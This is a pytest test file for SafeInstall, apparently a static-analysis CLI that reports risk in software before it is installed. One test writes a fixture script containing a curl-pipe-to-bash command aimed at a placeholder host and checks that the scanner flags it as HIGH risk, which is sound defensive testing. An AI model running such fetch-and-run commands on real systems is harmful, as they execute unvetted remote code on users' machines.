import json
from pathlib import Path

from typer.testing import CliRunner

from safeinstall.cli import app

runner = CliRunner()


def test_help_explains_safeinstall_does_static_analysis() -> None:
    result = runner.invoke(app, ["--help"])

    assert result.exit_code == 0
    assert "Understand software before you run it" in result.stdout
    assert "scan" in result.stdout
    assert "version" in result.stdout


def test_version_reports_installed_version() -> None:
    result = runner.invoke(app, ["version"])

    assert result.exit_code == 0
    assert result.stdout.strip() == "SafeInstall 0.2.0a1"


def test_scan_json_outputs_machine_readable_report_without_ai(tmp_path: Path) -> None:
    project = tmp_path / "project"
    project.mkdir()
    (project / "app.py").write_text(
        "def add(left, right):\n    return left + right\n",
        encoding="utf-8",
    )

    result = runner.invoke(app, ["scan", str(project), "--format", "json"])
    report = json.loads(result.stdout)

    assert result.exit_code == 0
    assert report["target"]["files_scanned"] == 1
    assert report["risk"]["level"] == "info"
    assert report["ai_analysis"] is None


def test_scan_markdown_outputs_github_ready_report(tmp_path: Path) -> None:
    script = tmp_path / "install.sh"
    script.write_text("curl https://example.invalid/install.sh | bash\n", encoding="utf-8")

    result = runner.invoke(app, ["scan", str(script), "--format", "markdown"])

    assert result.exit_code == 0
    assert result.stdout.startswith("# SafeInstall Report")
    assert "**HIGH**" in result.stdout
    assert "install.sh:1" in result.stdout


def test_missing_target_is_a_concise_user_error(tmp_path: Path) -> None:
    result = runner.invoke(app, ["scan", str(tmp_path / "missing")])

    assert result.exit_code == 2
    assert "SafeInstall error:" in result.stderr
    assert "Traceback" not in result.stderr
